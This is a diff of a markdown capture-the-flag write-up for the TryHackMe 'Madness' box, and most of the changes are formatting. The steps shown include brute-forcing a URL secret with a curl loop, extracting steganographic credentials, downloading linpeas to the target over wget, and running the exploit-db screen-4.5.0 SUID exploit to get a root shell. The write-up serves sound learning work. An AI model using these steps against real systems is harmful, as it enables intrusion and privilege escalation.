@@ -1,6 +1,7 @@
-##User Flag:
+# Madness
+## User Flag:
 Had to run a Hex Editor
-```flatpak run net.werwolv.ImHex```
+`flatpak run net.werwolv.ImHex`
 Replaced the first 8 bytes with 10 bytes for JFIF
 
 Asked me to go to a hidden directory at
@@ -10,10 +11,12 @@ Asks for a secret, you can query it in the URL with
 ?secret=73
 
 Loop curls to find the right secret:
-```for i in {0..99}; do                              
+```
+for i in {0..99}; do                              
   res=$(curl -s "http://10.67.189.192/th1s_1s_h1dd3n/?secret=$i")
   echo "$res" | grep -q "That is wrong" || echo "FOUND: $i"
-done```
+done
+```
 
 
 You will then get this:
@@ -22,16 +25,13 @@ You will then get this:
 
 I believe this is the password for the ssh user account, but I need the username, as hinted by the dialogue. Attempted to navigate to robots.txt or sitemap.xml, nothing on both.
 Tried to look at the headers for the site, nothing
-```curl -I http://10.67.189.192```
+`curl -I http://10.67.189.192`
 
 Tried to see if it's revealed in the ssh, did not work
-```nc 10.67.189.192 22```
+`nc 10.67.189.192 22`
 
-```gobuster dir -u http://10.67.189.192 -w /home/kali/Desktop/SecLists/Discovery/Web-Content/Web-Servers/Apache.txt```
-===============================================================
-Gobuster v3.8.2
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
+`gobuster dir -u http://10.67.189.192 -w /home/kali/Desktop/SecLists/Discovery/Web-Content/Web-Servers/Apache.txt`
+
 [+] Url:                     http://10.67.189.192
 [+] Method:                  GET
 [+] Threads:                 10
@@ -39,19 +39,14 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 [+] Negative Status codes:   404
 [+] User Agent:              gobuster/3.8.2
 [+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
+
 .htaccess            (Status: 403) [Size: 278]
 .htpasswd            (Status: 403) [Size: 278]
 .htaccess.bak        (Status: 403) [Size: 278]
 server-status        (Status: 403) [Size: 278]
 
-```gobuster dir -u http://10.67.189.192/th1s_1s_h1dd3n -w /home/kali/Desktop/SecLists/Discovery/Web-Content/raft-large-files.txt```
-===============================================================
-Gobuster v3.8.2
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
+`gobuster dir -u http://10.67.189.192/th1s_1s_h1dd3n -w /home/kali/Desktop/SecLists/Discovery/Web-Content/raft-large-files.txt`
+
 [+] Url:                     http://10.67.189.192/th1s_1s_h1dd3n
 [+] Method:                  GET
 [+] Threads:                 10
@@ -59,9 +54,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 [+] Negative Status codes:   404
 [+] User Agent:              gobuster/3.8.2
 [+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
+
 index.php            (Status: 200) [Size: 406]
 .htaccess            (Status: 403) [Size: 278]
 .                    (Status: 200) [Size: 406]
@@ -82,11 +75,12 @@ wp-forum.phps        (Status: 403) [Size: 278]
 Progress: 37050 / 37050 (100.00%)
 
 Tried to get any localhost, DNS info that could lead back to username with dig
-```dig -x 10.67.128.132```
+`dig -x 10.67.128.132`
 Did not work, no DNS data [NXDOMAIN]
 
 I used steghide on the banner image
-```steghide info 5iW7kC8.jpg ```
+`steghide info 5iW7kC8.jpg `
+
 "5iW7kC8.jpg":
   format: jpeg
   capacity: 6.6 KB
@@ -100,17 +94,14 @@ Enter passphrase:
 As we can see, it has a embedded file "password.txt"
 
 I then used stegseek to bruteforce the pass:
-```stegseek 5iW7kC8.jpg /usr/share/wordlists/rockyou.txt```
+`stegseek 5iW7kC8.jpg /usr/share/wordlists/rockyou.txt`
 The passphrase was ""
 
 I didn't think you'd find me! Congratulations!
-
 Here take my password
-
 *axA&GF8dP
 
-
-```steghide extract -sf thm.jpg```   
+`steghide extract -sf thm.jpg`
 Enter passphrase: 
 wrote extracted data to "hidden.txt".
 
@@ -124,35 +115,39 @@ joker
 
 ## Root Flag:
 I wanted to run linpeas on the target PC so I made a pywww folder and copied over my linpeas.sh document
-```cp /usr/share/peass/linpeas/linpeas.sh linpeas.sh```
+`cp /usr/share/peass/linpeas/linpeas.sh linpeas.sh`
 
 I then set it up on a webserver
-```python3 -m http.server 80```
+`python3 -m http.server 80`
 
 I also did an ifconfig to get my VPN's IP for TryHackMe
 
 I then went back to the target machine and ran
-```wget http://[IP Address]:80/linpeas.sh```
+`wget http://[IP Address]:80/linpeas.sh`
 
-used ```chmod +x linpeas.sh```
+used `chmod +x linpeas.sh`
 
 and did ./linpeas.sh to get some info from it
 
 Linpeas kind of led me astray, I tried some stuff with the CVEs that it found but to no avail. I then went and tried some other boxes and learned some other PE commands I can try. I used 
-```find / -perm -4000 2>/dev/null```
+`find / -perm -4000 2>/dev/null`
 to find the commands that I could run at root and found these files:
-```/bin/screen-4.5.0
-/bin/screen-4.5.0.old```
+```
+/bin/screen-4.5.0
+/bin/screen-4.5.0.old
+```
 
 These files let me run as root after checking ls 
-```-la /bin/screen-4.5.0```
+`-la /bin/screen-4.5.0`
 
 I found an exploit that uses a writable log file feature within this screen to give us library execution as root, allowing us to create a root shell on the device.
-```https://www.exploit-db.com/download/41154```
+`https://www.exploit-db.com/download/41154`
 
 I copied the bash over with a python webserver and then ran these 
-```sed -i 's/\r$//' screen_exploit.sh``` -- There was some issue with it running so this fixed some headers
-```chmod +x screen_exploit.sh```
-```./screen_exploit.sh```
+```
+sed -i 's/\r$//' screen_exploit.sh #There was some issue with it running so this fixed some headers
+chmod +x screen_exploit.sh
+./screen_exploit.sh
+```
 
 I then cat'd the root file and got the flag 
